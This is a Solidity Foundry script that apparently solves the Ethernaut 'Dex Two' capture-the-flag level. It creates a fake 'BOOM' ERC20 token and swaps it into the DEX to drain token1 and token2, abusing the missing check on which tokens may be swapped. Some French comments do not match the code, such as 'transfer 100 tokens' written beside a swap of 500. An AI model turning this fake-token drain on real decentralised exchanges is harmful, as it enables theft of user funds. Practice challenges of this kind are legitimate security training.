// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {DexTwo} from "../src/DexTwo.sol";
import {Script, console} from "forge-std/Script.sol";
import {IERC20} from "../lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "../lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

contract DexTwoSolution is Script {
    DexTwo dexTwo = DexTwo(0xe14712e768A0e7bcBE04CeB22555ff509284F9Ad);

    address myAddress = vm.envAddress("MY_ADDRESS");
    address dexAddress = address(dexTwo);
    fakeIERC20 fakeErc = fakeIERC20(0xA9CFA211227895AbA90643ee814ad720093baDDe);

    uint256 fakeERC20OnDex = fakeErc.balanceOf(address(dexTwo));
    uint256 fakeErc20OnMyAddress = fakeErc.balanceOf(myAddress);

    address token1 = dexTwo.token1();
    address token2 = dexTwo.token2();
    address fakeErcToken = address(fakeErc);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("------------address--------------");
        console.log("Dex address is : ", dexAddress);
        console.log("My address is : ", myAddress);
        console.log("Fake ERC20 address is : ", fakeErcToken);

        console.log("---------------------------------");

        console.log("Amount of fake ERC20 got by the dex : ", fakeERC20OnDex);
        console.log("Amount of fake ERC20 got by me : ", fakeErc20OnMyAddress);

        // Calcul du montant nécessaire pour obtenir 100 tokens de token1
        uint256 swapAmount = dexTwo.getSwapAmount(fakeErcToken, token1, 100);
        console.log("Amount of fake ERC20 to deposit to get 100 of token 1 is : ", swapAmount);

        // Correction: S'assurer que l'approbation couvre le montant à échanger
        fakeErc.approve(address(dexTwo), type(uint256).max); // Approbation pour 100 tokens au lieu de 83
        // Exécution du swap
        dexTwo.swap(fakeErcToken, token1, 500); // Essaye de transférer 100 tokens
        dexTwo.swap(fakeErcToken, token2, 1000);
        console.log("Amount of token1 after the swap : ", dexTwo.balanceOf(token1, myAddress));
        console.log("Amount of token2 after the swap : ", dexTwo.balanceOf(token2, myAddress));

        vm.stopBroadcast();
    }
}

contract fakeIERC20 is ERC20, Script {
    constructor(address _address, address _dexAddress) ERC20("BOOM", "BOOM") {
        _mint(_address, 50000);
        _mint(_dexAddress, 500);
    }
}
